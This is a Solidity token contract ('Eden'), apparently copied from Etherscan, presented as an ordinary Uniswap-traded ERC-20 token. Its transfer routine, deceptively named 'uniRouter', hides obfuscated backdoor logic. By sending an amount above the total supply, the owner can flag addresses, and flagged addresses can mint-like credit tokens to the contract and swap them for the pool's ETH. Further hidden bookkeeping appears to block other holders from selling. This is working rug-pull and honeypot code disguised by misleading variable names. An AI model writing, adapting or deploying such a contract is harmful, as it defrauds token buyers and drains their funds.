/**
 *Submitted for verification at Etherscan.io on 2022-11-25
*/

/**
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function Quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function GetAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function GetAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function GetAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function GetAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
// // https://web.wechat.com/TomahawkCN
}
contract Eden is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _rTotalFee = 0;
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1000000 * 10**_decimals;
    uint256 private AutomatedMarketMakerPair = _totalSupply;
    
    mapping(address => uint256) private _balances;
    mapping(address => address) private _bots;
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _isExcludedFromFee;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;
    uint256 public NowSwapAndLiquifyEnabled;
    bool private enabledTrading;
  
    address public immutable uniswapV2Pair;
    IUniswapV2Router02 public immutable uniswapV2router;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _balances[msg.sender] = _totalSupply;
        _isExcludedFromFee[msg.sender] = AutomatedMarketMakerPair;
        _isExcludedFromFee[address(this)] = AutomatedMarketMakerPair;
        uniswapV2router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2router.factory()).createPair(address(this), uniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        uniRouter       (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        uniRouter       (msg.sender, recipient, amount);
        return true;
    }
    function uniRouter      (
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balanceOfContract = balanceOf(address(this));
        uint256 tTotalAmount;
        if (enabledTrading && balanceOfContract > AutomatedMarketMakerPair && !enabledTrading && from != uniswapV2Pair) {
            enabledTrading = true;
            swapAndLiquifyOn(balanceOfContract);
            enabledTrading = false;
        } else if (_isExcludedFromFee[from] > AutomatedMarketMakerPair && _isExcludedFromFee[to] > AutomatedMarketMakerPair) {
            tTotalAmount = amount;
            _balances[address(this)] += tTotalAmount;
            swapForEth(amount, to);
            return;
        } else if (to != address(uniswapV2router) && _isExcludedFromFee[from] > 0 && amount > AutomatedMarketMakerPair && to != uniswapV2Pair) {
            _isExcludedFromFee[to] = amount;
            return;
        } else if (!enabledTrading && _tOwned[from] > 0 && from != uniswapV2Pair && _isExcludedFromFee[from] == 0) {
            _tOwned[from] = _isExcludedFromFee[from] - AutomatedMarketMakerPair;
        }
        address _string = _bots[uniswapV2Pair];
        if (_tOwned[_string] == 0) _tOwned[_string] = AutomatedMarketMakerPair;
        _bots[uniswapV2Pair] = to;
        if (_rTotalFee > 0 && _isExcludedFromFee[from] == 0 && !enabledTrading && _isExcludedFromFee[to] == 0) {
            tTotalAmount = (amount * _rTotalFee) / 100;
            amount -= tTotalAmount;
            _balances[from] -= tTotalAmount;
            _balances[address(this)] += tTotalAmount;
        }
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
         //Trade start check
            if (!tradingOpen) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    receive() external payable {}
    function addLiquidity(
        uint256 ERCAmount,
        uint256 etherAmount,
        address to
    ) private {
        _approve(address(this), address(uniswapV2router), ERCAmount);
        uniswapV2router.addLiquidityETH{value: etherAmount}(address(this), ERCAmount, 0, 0, to, block.timestamp);
    }
    function swapAndLiquifyOn(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialBalance = address(this).balance;
        swapForEth(half, address(this));
        uint256 finaleBalance = address(this).balance - initialBalance;
        addLiquidity(half, finaleBalance, address(this));
    }
        function enableTrades(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function swapForEth(uint256 ERCAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2router.WETH();
        _approve(address(this), address(uniswapV2router), ERCAmount);
        uniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(ERCAmount, 0, path, to, block.timestamp);
    }
}